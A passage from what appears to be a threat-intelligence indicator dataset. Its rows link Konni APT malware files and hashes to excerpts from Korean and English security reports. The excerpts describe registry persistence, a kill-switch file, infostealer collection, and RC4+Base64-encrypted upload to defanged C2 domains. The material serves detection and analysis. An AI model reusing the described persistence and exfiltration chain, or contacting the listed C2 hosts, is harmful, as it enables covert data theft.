배치파일 위치를 저장하기 위해 ‘pushd ""%~dp0""’ 명령을 상단에 추가합니다. 그리고 ‘30966118.bat’ 파일",
1.0.0,actor--konni,artifact--sha256:1315fd6068b80ae8d605eb6d2397cbd1607fb31732fab8edfb64454f1c8eaaaf,observation--sha256:65cf1b4f46e5b0951da180ae26ce871ff05ed48035df169f087d3c04cecb924d,file-name,32981202.bat,32981202.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 25}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 24 [그림 15] 73888454.bat 파일 내부 코드 화면 ○ 만약 ‘30966118.bat’ 파일이 없을 경우에는 ""upok.txt"" 파일이 존재하지 않을 경우에만 ‘32981202.bat’ 파일을 실행하는데, ‘upok.txt’ 파일은 컴퓨터 정보가 유출(Upload OK)될 때 만들어 집니다. ○ 그 다음 루틴은 ‘pakistan.txt’ 파일 존재 여부에 따라 (goto 1), (goto EXIT)로 분기됩니다. 처음 악성 파일이 작동할 때는 해당 파일이 존재하지 않기 때문에 (goto 1) 루틴으로 점프하게 됩니다. 만약 파일이 존재할 경우에는 (goto EXIT) 루틴은 ‘pakistan.txt’ 파일을 삭제하고 종료되는데, 일종의 ‘킬 스위치(Kill Switch)’와 같은 비상 종료 기능을 수행합니다. 이는 다수의 Konni 캠페인에서 지속적으로 사용중인 방식입니다.",
1.0.0,actor--konni,artifact--sha256:1315fd6068b80ae8d605eb6d2397cbd1607fb31732fab8edfb64454f1c8eaaaf,observation--sha256:9ad390cd46ebb0003207c7522dc2900fd86b10f7aa9a62943d2807d007c867f1,file-name,32981202.bat,32981202.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 29}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 28 ○ 조건 분기에 따라 ‘85214.zip’ 파일이 존재하지 않으면, (goto END1) 루틴으로 이동해 주요 기능을 종료합니다. 만약 다운로드된 ‘85214.zip’ 파일이 존재할 경우 Powershell 명령으로 압축 파일을 확인하고, ‘unzip.exe’ 파일을 통해 미리 설정된 암호화 압축을 해제합니다. 그 다음 ‘rundll32.exe’ 파일로 추가 실행을 하는데, 해당 파일은 DLL 유형의 RAT 또는 Bot 형태일 가능성이 있습니다. [그림 22] 32981202.bat 에 의해 실행된 공격 스토리라인 [그림 23] 32981202.bat 에 의해 실행된 이벤트의 타임라인",
1.0.0,actor--konni,artifact--sha256:1315fd6068b80ae8d605eb6d2397cbd1607fb31732fab8edfb64454f1c8eaaaf,observation--sha256:1dc9597bccd46e44c37d8d7e6fa3270cf845a620a00309bf2bc1c91ccfa2df6e,file-name,32981202.bat,32981202.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 2}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 1 - 목차 (CONTENTS) – 01. 개요 (Overview) ................................................................................................ 2 a. 금융 및 기밀정보 위협 식별 (Threat Hunting) .................................................. 2 b. 악성 파일 동작 흐름도 (Malware Flowchart) .................................................... 3 c. Konni 배경 (Background) .............................................................................. 4 d. 공격 전술 및 기술, 절차 (TTPs) &",
1.0.0,actor--konni,artifact--sha256:1315fd6068b80ae8d605eb6d2397cbd1607fb31732fab8edfb64454f1c8eaaaf,observation--sha256:7fd0ebfa188da99120a30c4b44a3ec23eff7a85fbfa88a4295a4e006b87ff8cd,file-name,32981202.bat,32981202.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Threat Intelligence Report Genians Security Center 30 e. ‘32981202.bat’ ○ ‘73888454.bat’ 파일에 의해 호출되는 ‘32981202.bat’ 파일은 피해 컴퓨터의 주요 정보를 수집하는 인포스틸러(InfoStealer) 목적의 정보탈취 기능을 수행합니다. 파일명 32981202.bat MD5 ee8cd48b48c39cbb869589a629702b7a SHA1 ba11648632e52bcb1754983fd4aa1c703bcad38f SHA256 f4751a93ac8d901fcd9a46dfdd3aee225745c8f05d1937635 ed8b53b5e428022 [표 11] 32981202.bat 파일 HASH 정보 화면 ○ 본 배치 파일은 사용자 컴퓨터의 주요 정보를 수집해 별도의 파일로 저장해 공격자가 운영하는 C2(overseeby[.]com) 서버로 전송하기 위한 준비작업을 합니다. [그림 18] 32981202.b,
1.0.0,actor--konni,artifact--sha256:1315fd6068b80ae8d605eb6d2397cbd1607fb31732fab8edfb64454f1c8eaaaf,observation--sha256:2a40644d068b21966174f9517bdf436cb9ff297c015662104f57cf9721238422,file-name,32981202.bat,32981202.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Threat Intelligence Report Genians Security Center 32 [그림 19] 32981202.bat 에 의해 실행된 공격 스토리라인 [그림 20] 32981202.bat 에 의해 실행된 이벤트의 타임라인,
1.0.0,actor--konni,artifact--sha256:1315fd6068b80ae8d605eb6d2397cbd1607fb31732fab8edfb64454f1c8eaaaf,observation--sha256:a9b4da552714607ffb99038c90d8562eb522ace2635add028b391d6493574174,file-name,32981202.bat,32981202.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 35}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 34 g. ‘07856126.bat’ ○ 본 파일도 [RC4+Base64] 암호화 루틴을 가지고 있으며, 사용자 정보를 C2 서버로 유출할 때 암호화하는 용도로 사용이 됩니다. 파일명 07856126.bat MD5 14600ffc77c091a708a8df26b0043a84 SHA1 1953a2a6c8ec43230ae2eb920efe5d85d50b8cf4 SHA256 a9605c875079f350ffe66f2647289c5fea95ce5cdfecebe967 5bc6ed22c77dd7 [표 15] 07856126.bat 파일 HASH 정보 화면 ○ ‘32981202.bat’ 파일이 호출할 때 사용하며, 수집된 각종 정보 텍스트(txt) 파일을 암호화해 업로드할 때 사용되며, fn(filename), fd(filedata), r(rc4 key) 등이 함께 전송되고, 업로드가 완료되면 ‘upok.tx",
1.0.0,actor--konni,artifact--sha256:1315fd6068b80ae8d605eb6d2397cbd1607fb31732fab8edfb64454f1c8eaaaf,observation--sha256:8ea6b098d07aa6fbec1e6635a8d6aad18e0639f0eeb57745c6b89316cf7f34e8,file-name,32981202.bat,32981202.bat,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 35}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○LNK 바로가기파일에의해Drop 되는ZIP 압축파일은다음과같은구성을가지고있습니다. 국세청사칭ZIP파일구성 북한인권단체사칭ZIP파일구성 start.vbs update.vbs 07856126.bat paycom.ini 19288086.bat resolvedns.bat 30966118.bat stopedge.bat 32981202.bat versioninfo.bat 73888454.bat activate.vbs unzip.exe unactivate.vbs - install.vbs - unzip.exe[표5-2] Konni 캠페인별ZIP파일비교화면 ○국세청사칭의경우'73888454.bat' 파일은'30966118.bat' 파일이존재할경우레지스트리 Run 경로에 'start.vbs' 파일을 등록해 지속성을 유지합니다. 반면,북한인권단체 사칭의 경우 'stopedge.bat' 파일은 'paycom.ini' 파일이존재할경우작업 스케줄러 생성을 통해",
1.0.0,actor--konni,artifact--sha256:c33fa0780bb666dd285290da1b566b0d2cde684e9467f31451df1cb5d6620c74,observation--sha256:c9de739eda46846d5ab604f9e6b81c3be3ae06c560cc9ba2d931a0fcf702fd00,file-name,73888454.bat,73888454.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 18 ○ ‘start.vbs’ 파일은 레지스트리에 등록돼 컴퓨터가 부팅될 때마다 작동하며, 단계별 배치 파일 실행 역할을 수행합니다. 07856126.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로 Key 값은 ‘(Get-Date).Ticks.ToString()’ 문자로 사용 a. ‘32981202.bat’ 파일이 업로드시 사용 - C2 로 정보 업로드 후 ‘upok.txt’ 생성 19288086.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로 Key 값은 ‘(Get-Date).Ticks.ToString()’ 문자로 사용 a. ‘30966118.bat’ 파일이 다운로드시 사용 b. ‘73888454.bat’ 파일이 다운로드시 사용 30966118.bat - ‘19288086.bat’ 루틴을 이용해 C2(naver.cloudfile",
1.0.0,actor--konni,artifact--sha256:c33fa0780bb666dd285290da1b566b0d2cde684e9467f31451df1cb5d6620c74,observation--sha256:cb716dfaee9b2e21ce844b7c9bb1c3b8064ced311327c3508d141cf2449bf79a,file-name,73888454.bat,73888454.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 19 b. fd - Base64+RC4 로 인코딩된 데이터 c. r - RC4 Key 값 [Powershell (Get-Date).ticks]7 73888454.bat - ‘30966118.bat’ 파일 존재 시 : a. 레지스트리 Run 에 ‘svchostno2’ 이름으로 ‘start.vbs’ 등록 b. ‘30966118.bat’ 실행 후 이후 명령에서 삭제 c. ‘32981202.bat’ 실행 - ‘30966118.bat’, ‘upok.txt’ 파일 없을 시 : a. ‘32981202.bat’ 실행 - ‘pakistan.txt’ 파일 없을 시 : a. ‘temprun.bat’ 파일 존재시 삭제 b. ‘19288086.bat’ 파일 루틴을 통해 C2(overseeby[.]com)에서 감염 컴퓨터명 경로 파일을 ‘IxOkj.cab’ 다운로드 후 압축 해제하고 삭제 c. 압축 해제 된 파일 ‘t",
1.0.0,actor--konni,artifact--sha256:c33fa0780bb666dd285290da1b566b0d2cde684e9467f31451df1cb5d6620c74,observation--sha256:4f517d3187ac6b9ed1f9659360e59394132301535d190a99f1492028641b8a29,file-name,73888454.bat,73888454.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 23}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 22 b. ‘start.vbs’ ○ 본 파일은 ZIP 파일이 풀린 후 가장 먼저 실행되는 파일로, Visual Basic Script 명령을 수행하게 됩니다. 파일명 start.vbs MD5 19ecb637cb3ba2660994eb87990c82d7 SHA1 cd81d310dd6b6029959e3c57dc11b751ab8220f4 SHA256 3c79f5bc1608f7582253cf201824d75d7c5cfbaa15334797 9e3ca701ceaefa20 [표 06] start.vbs 파일 HASH 정보 화면 ○ 파일 내부에는 다음과 같은 명령어를 가지고 있으며, 압축이 풀렸던 동일 경로의 ‘73888454.bat’ 배치 파일을 실행(Run)하는 명령을 수행하고 종료합니다. [그림 13] VBS 스크립트 내부 코드 화면 [그림 14] start.vbs 의 스크립트 코드를 실행시키기 위한 w",
1.0.0,actor--konni,artifact--sha256:c33fa0780bb666dd285290da1b566b0d2cde684e9467f31451df1cb5d6620c74,observation--sha256:41d5c93b271ec5c083d743572922bbceec6ee3112045640a4432156976854b87,file-name,73888454.bat,73888454.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 24}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 23 c. ‘73888454.bat’ ○ VBS 다음에 실행되는 ‘73888454.bat’ 파일은 레지스트리 등록, 피해 컴퓨터 정보 수집 명령 호출, 파일 다운로드 등을 수행합니다. 파일명 73888454.bat MD5 29b3fa2293c63145e544318ca65a67cf SHA1 0fe0379d20570aaaaeac68ac0355feab514c7452 SHA256 14209a0d81a0d05757cf73a18c85cf0a1a6f13a042775430 0031e078ce128c32 [표 07] 73888454.bat 파일 HASH 정보 화면 ○ 본 일괄 배치 파일은 커맨드(CMD) 화면에 수행 내용이 출력되지 않도록 ‘@echo off’ 선언을 합니다. ○ 실행된 배치파일 위치를 저장하기 위해 ‘pushd ""%~dp0""’ 명령을 상단에 추가합니다. 그리고 ‘30966118.bat’ 파일",
1.0.0,actor--konni,artifact--sha256:c33fa0780bb666dd285290da1b566b0d2cde684e9467f31451df1cb5d6620c74,observation--sha256:52fb7eda9f9fbdf4946acda6b106a9d04fdec7871fa302d45003ea993fb6509f,file-name,73888454.bat,73888454.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 25}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 24 [그림 15] 73888454.bat 파일 내부 코드 화면 ○ 만약 ‘30966118.bat’ 파일이 없을 경우에는 ""upok.txt"" 파일이 존재하지 않을 경우에만 ‘32981202.bat’ 파일을 실행하는데, ‘upok.txt’ 파일은 컴퓨터 정보가 유출(Upload OK)될 때 만들어 집니다. ○ 그 다음 루틴은 ‘pakistan.txt’ 파일 존재 여부에 따라 (goto 1), (goto EXIT)로 분기됩니다. 처음 악성 파일이 작동할 때는 해당 파일이 존재하지 않기 때문에 (goto 1) 루틴으로 점프하게 됩니다. 만약 파일이 존재할 경우에는 (goto EXIT) 루틴은 ‘pakistan.txt’ 파일을 삭제하고 종료되는데, 일종의 ‘킬 스위치(Kill Switch)’와 같은 비상 종료 기능을 수행합니다. 이는 다수의 Konni 캠페인에서 지속적으로 사용중인 방식입니다.",
1.0.0,actor--konni,artifact--sha256:c33fa0780bb666dd285290da1b566b0d2cde684e9467f31451df1cb5d6620c74,observation--sha256:db14952e0c69983e836120940b2c47c2e62994cdc86560fb146aa67bbc4f0879,file-name,73888454.bat,73888454.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 27}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Threat Intelligence Report Genians Security Center 26 ○ 영국 정보 기관인 GCHQ 에서 만든 데이터 분석 및 변환을 위한 오픈 소스 웹 프로그램인 CyberChef 기능을 통해 [Base64+RC4] 데이터를 간편하게 복호화할 수 있습니다.8 [그림 16] CyberChef 디코딩 화면 ○ 다음으로 57 초 대기시간을 유지한 후 ‘pakistan.txt’ 파일 비교루틴을 수행하게 됩니다. [그림 17] 73888454.bat 실행에 의해 자동실행 레지스트리 등록된 start.vbs 8 CyberChef 웹 사이트,
1.0.0,actor--konni,artifact--sha256:c33fa0780bb666dd285290da1b566b0d2cde684e9467f31451df1cb5d6620c74,observation--sha256:2eb026a900264bdb11997f32008cbf185f5e84a3a9250c3790173debdd0f7e00,file-name,73888454.bat,73888454.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 28}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 27 d. ‘30966118.bat’ ○ 본 파일은 ‘73888454.bat’ 명령에서 파일 존재 조건 성립과 레지스트리 등록 후 호출되는 배치 파일입니다. 파일명 30966118.bat MD5 b307e8e59113ddeb622f53ae37ade042 SHA1 d029fbeed3c0a1e535e7e7bbb48277afa105b835 SHA256 199a9bb434a86029f7ad3fe87b3e6d2478487502ef7b0125 69b3029b8fbc7e15 [표 13 ] 30966118.bat 파일 HASH 정보 화면 ○ ‘19288086.bat’ 파일 호출을 통해 C2(naver.cloudfiles001[.]com) 서버로 접근하고, 변수로 지정된 ‘85214.zip’ 파일 다운로드를 수행합니다. 분석 당시 해당 파일이 다운로드 되지는 않았습니다. 공격자는 감염된 컴퓨터명을 확인해 선별",
1.0.0,actor--konni,artifact--sha256:c33fa0780bb666dd285290da1b566b0d2cde684e9467f31451df1cb5d6620c74,observation--sha256:6dd1a073b0404e8df53ae9b311ef7cea007dc9e02dc9c2769f01e752cee02778,file-name,73888454.bat,73888454.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 2}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 1 - 목차 (CONTENTS) – 01. 개요 (Overview) ................................................................................................ 2 a. 금융 및 기밀정보 위협 식별 (Threat Hunting) .................................................. 2 b. 악성 파일 동작 흐름도 (Malware Flowchart) .................................................... 3 c. Konni 배경 (Background) .............................................................................. 4 d. 공격 전술 및 기술, 절차 (TTPs) &",
1.0.0,actor--konni,artifact--sha256:c33fa0780bb666dd285290da1b566b0d2cde684e9467f31451df1cb5d6620c74,observation--sha256:bb19e0821a0401733730c0c9470f69ee1f1c5e9035bb36ad3c017cee317f9500,file-name,73888454.bat,73888454.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Threat Intelligence Report Genians Security Center 30 e. ‘32981202.bat’ ○ ‘73888454.bat’ 파일에 의해 호출되는 ‘32981202.bat’ 파일은 피해 컴퓨터의 주요 정보를 수집하는 인포스틸러(InfoStealer) 목적의 정보탈취 기능을 수행합니다. 파일명 32981202.bat MD5 ee8cd48b48c39cbb869589a629702b7a SHA1 ba11648632e52bcb1754983fd4aa1c703bcad38f SHA256 f4751a93ac8d901fcd9a46dfdd3aee225745c8f05d1937635 ed8b53b5e428022 [표 11] 32981202.bat 파일 HASH 정보 화면 ○ 본 배치 파일은 사용자 컴퓨터의 주요 정보를 수집해 별도의 파일로 저장해 공격자가 운영하는 C2(overseeby[.]com) 서버로 전송하기 위한 준비작업을 합니다. [그림 18] 32981202.b,
1.0.0,actor--konni,artifact--sha256:c33fa0780bb666dd285290da1b566b0d2cde684e9467f31451df1cb5d6620c74,observation--sha256:24d623bb2788d0e31d353bcdca354e4e388adc4c6f79d82102c8953ca0068f3a,file-name,73888454.bat,73888454.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 34}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 33 f. ‘19288086.bat’ ○ ‘19288086.bat’ 파일은 환경변수 조건에 따라 Powershell 명령을 통해 [RC4+Base64] 암호화와 다운로드 설정 루틴을 지니고 있습니다. 파일명 19288086.bat MD5 b4461d68a8026981ab47294c2c7b5d91 SHA1 f1b4748d50a38952edc2f0953cd270ec17bb5b2a SHA256 79f61da076edf4cc9434e1c1f25ca62664d5f0bc5b9b91736 60f3089491eb8fe [표 14] 19288086.bat 파일 HASH 정보 화면 ○ 변수명 (if not ""%ypczipzqWxLByMQH%"" == ""0"") 에 따라 암호화 루틴이 작동하는데, ‘73888454.bat’ 파일에서 호출 될 때 사용이 됩니다. [그림 25] 19288086.bat 내부 코드 화면",
1.0.0,actor--konni,artifact--sha256:c33fa0780bb666dd285290da1b566b0d2cde684e9467f31451df1cb5d6620c74,observation--sha256:c32726bc046c23d900cbf41e246d05a3988e4283cc22d7734b936832750b447a,file-name,73888454.bat,73888454.bat,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 35}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○LNK 바로가기파일에의해Drop 되는ZIP 압축파일은다음과같은구성을가지고있습니다. 국세청사칭ZIP파일구성 북한인권단체사칭ZIP파일구성 start.vbs update.vbs 07856126.bat paycom.ini 19288086.bat resolvedns.bat 30966118.bat stopedge.bat 32981202.bat versioninfo.bat 73888454.bat activate.vbs unzip.exe unactivate.vbs - install.vbs - unzip.exe[표5-2] Konni 캠페인별ZIP파일비교화면 ○국세청사칭의경우'73888454.bat' 파일은'30966118.bat' 파일이존재할경우레지스트리 Run 경로에 'start.vbs' 파일을 등록해 지속성을 유지합니다. 반면,북한인권단체 사칭의 경우 'stopedge.bat' 파일은 'paycom.ini' 파일이존재할경우작업 스케줄러 생성을 통해",
1.0.0,actor--konni,artifact--sha256:0a90f8abbc9f100611c877e2744bfde72e236c569e5fce6608edc23e55a17486,observation--sha256:c38b1f1adbdd40593634cced6c16334877515cb93b1dc040b31f5676bfb7171e,file-name,85214.zip,85214.zip,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 18 ○ ‘start.vbs’ 파일은 레지스트리에 등록돼 컴퓨터가 부팅될 때마다 작동하며, 단계별 배치 파일 실행 역할을 수행합니다. 07856126.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로 Key 값은 ‘(Get-Date).Ticks.ToString()’ 문자로 사용 a. ‘32981202.bat’ 파일이 업로드시 사용 - C2 로 정보 업로드 후 ‘upok.txt’ 생성 19288086.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로 Key 값은 ‘(Get-Date).Ticks.ToString()’ 문자로 사용 a. ‘30966118.bat’ 파일이 다운로드시 사용 b. ‘73888454.bat’ 파일이 다운로드시 사용 30966118.bat - ‘19288086.bat’ 루틴을 이용해 C2(naver.cloudfile",
1.0.0,actor--konni,artifact--sha256:0a90f8abbc9f100611c877e2744bfde72e236c569e5fce6608edc23e55a17486,observation--sha256:4c39766f9f6863d1c41a61e11e298f2e4e568c74bdf4198d93202832e1c6c6bc,file-name,85214.zip,85214.zip,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 28}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 27 d. ‘30966118.bat’ ○ 본 파일은 ‘73888454.bat’ 명령에서 파일 존재 조건 성립과 레지스트리 등록 후 호출되는 배치 파일입니다. 파일명 30966118.bat MD5 b307e8e59113ddeb622f53ae37ade042 SHA1 d029fbeed3c0a1e535e7e7bbb48277afa105b835 SHA256 199a9bb434a86029f7ad3fe87b3e6d2478487502ef7b0125 69b3029b8fbc7e15 [표 13 ] 30966118.bat 파일 HASH 정보 화면 ○ ‘19288086.bat’ 파일 호출을 통해 C2(naver.cloudfiles001[.]com) 서버로 접근하고, 변수로 지정된 ‘85214.zip’ 파일 다운로드를 수행합니다. 분석 당시 해당 파일이 다운로드 되지는 않았습니다. 공격자는 감염된 컴퓨터명을 확인해 선별",
1.0.0,actor--konni,artifact--sha256:0a90f8abbc9f100611c877e2744bfde72e236c569e5fce6608edc23e55a17486,observation--sha256:62f3bdc0fcedf90f53ac06b4a656bbf9440d279284c5104e1152f042216a21aa,file-name,85214.zip,85214.zip,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 29}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 28 ○ 조건 분기에 따라 ‘85214.zip’ 파일이 존재하지 않으면, (goto END1) 루틴으로 이동해 주요 기능을 종료합니다. 만약 다운로드된 ‘85214.zip’ 파일이 존재할 경우 Powershell 명령으로 압축 파일을 확인하고, ‘unzip.exe’ 파일을 통해 미리 설정된 암호화 압축을 해제합니다. 그 다음 ‘rundll32.exe’ 파일로 추가 실행을 하는데, 해당 파일은 DLL 유형의 RAT 또는 Bot 형태일 가능성이 있습니다. [그림 22] 32981202.bat 에 의해 실행된 공격 스토리라인 [그림 23] 32981202.bat 에 의해 실행된 이벤트의 타임라인",
1.0.0,actor--konni,artifact--sha256:c7636952e8f48199b4830e7324d6521c24d1ba18163e3f9d6e8af1c05ba58f59,observation--sha256:5e9a46d57db5b26ca0fd2e49445f6742c53431638fad549a51d6f87912987bc4,file-name,8unactivate.vbs,8unactivate.vbs,candidate,,unknown,unknown,not-stated,,source--konni--8c179de8de042c5a,konni/the-konni-apt-chronicle-tracing-their-intelligence-driven-attack-chain.pdf,"{""page"": 2}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,TheKonni APTChronicle: TracingTheir Intelligence-DrivenAttackChain Contents Introduction.............................................................................................................................. 3Konni APTGroup.....................................................................................................................5Technical Analysis....................................................................................................................6Initial Compressi,
1.0.0,actor--konni,artifact--sha256:765d20bc561f33ba24fff2b1a7982cb47968e0d1706814d49376159904d73996,observation--sha256:52509fe6432a1cc42dca2c1cd94d7554e96ea30763f093b8b3623774851a4c74,file-name,9stopedge.bat,9stopedge.bat,candidate,,unknown,unknown,not-stated,,source--konni--8c179de8de042c5a,konni/the-konni-apt-chronicle-tracing-their-intelligence-driven-attack-chain.pdf,"{""page"": 2}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,TheKonni APTChronicle: TracingTheir Intelligence-DrivenAttackChain Contents Introduction.............................................................................................................................. 3Konni APTGroup.....................................................................................................................5Technical Analysis....................................................................................................................6Initial Compressi,
1.0.0,actor--konni,artifact--sha256:98598e3a7157928612f409db8c728d42cad78c55fb17725a96776a062ba39b2c,observation--sha256:e9b8dd5d1f10a4d45328e3ecea10f26561eb6f87d2af61e35f8cc58ee87bd8e1,file-name,Analysis_Report_Operation_Moneyholic.pdf,Analysis_Report_Operation_Moneyholic.pdf,candidate,2017-08-01T00:00:00Z,month,known,same-record,,source--konni--5b6e99ac261cea7a,konni/konni-threat-insight-paper-triple-threat-N-Korea-aligned-TA406-steals-scams-spies.pdf,"{""page"": 48}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Reference List https://asec.ahnlab.com/ko/1251/ https://blog.alyac.co.kr/2061 https://blog.alyac.co.kr/3014 https://blog.alyac.co.kr/3390 https://blog.alyac.co.kr/3550 https://blogs.blackberry.com/en/2017/08/threat-spotlight-konni-stealthy-remote-access-trojan https://blog.talosintelligence.com/2017/05/konni-malware-under-radar-for-years.html https://download.ahnlab.com/kr/site/library/Analysis_Report_Operation_Moneyholic.pdf https://e.cyberint.com/hubfs/Cyberint_Konni%20Malware%202019%20Campaig,
1.0.0,actor--konni,artifact--sha256:9a013e956f6fc4faef9b963f4e5cbb2167009e54201bd184aa605fa849943fe2,observation--sha256:65b994bb2e444f3f27d6b921b67f135a952bc92e2e18a38fe46cf628f2808aba,file-name,Deobfuscatedinstall.vbs,Deobfuscatedinstall.vbs,candidate,,unknown,unknown,not-stated,,source--konni--8c179de8de042c5a,konni/the-konni-apt-chronicle-tracing-their-intelligence-driven-attack-chain.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"TheKonni APTChronicle: TracingTheir Intelligence-DrivenAttackChain Technical Analysis Initial Compression Theattackchainbeginswiththedownloadof anISOimagefromanITWURL. ThisISOimagesubsequentlydeploysanother zipfile, whichcontainsmaliciousscripts. Figure2- Zipfilecontainslotsof scripts install.vbs Theinstall.vbsscript isheavilyobfuscatedusingXORandvariousother techniques. Figure3- Obfuscatedinstall.vbs Thedeobfuscatedversionof theVBScript isquitestraightforward; it merelyexecutesanother batchscri",
1.0.0,actor--konni,artifact--sha256:0f653f947384eeef50a00f20cf609b1c094f15af9478b51fd7bb411d84fa1b14,observation--sha256:b8585c544b4aed05d75f54c6c1cacd73163373eaa6aa16e4706e2a544dda0fcc,file-name,Deobfuscatedupdate.vbs,Deobfuscatedupdate.vbs,candidate,,unknown,unknown,not-stated,,source--konni--8c179de8de042c5a,konni/the-konni-apt-chronicle-tracing-their-intelligence-driven-attack-chain.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"TheKonni APTChronicle: TracingTheir Intelligence-DrivenAttackChain update.vbs The'update.vbs' closelyresembles'install.vbs,' employingthesameobfuscationtechniquesandperformingidentical tasks. Figure5- Obfuscatedupdate.vbs However, itsdistinctivefeatureisthat it executesascript named'stopedge.bat'. Figure6- Deobfuscatedupdate.vbs 7",
1.0.0,actor--konni,artifact--sha256:5d438d8a0edd63e50251ca79b47bd1743f3f81c56b656bca7423c4e95b214dfd,observation--sha256:c9edc8b832ce1949db830359683f687b6dcdbd69f1828d5600c04f705658c0ab,file-name,FatBoy.dll,FatBoy.dll,candidate,,unknown,unknown,not-stated,,source--konni--5b6e99ac261cea7a,konni/konni-threat-insight-paper-triple-threat-N-Korea-aligned-TA406-steals-scams-spies.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"June 2021 Proofpoint identified another email campaign from the same sender purporting to be a well-known foreign policy specialist. The campaign attempted to distribute a downloader that Proofpoint refers to as FatBoy, named after the FatBoy.dll file name used in this campaign. (Figure 32). Figure 32. FatBoy installation flow The messages contained an HTML 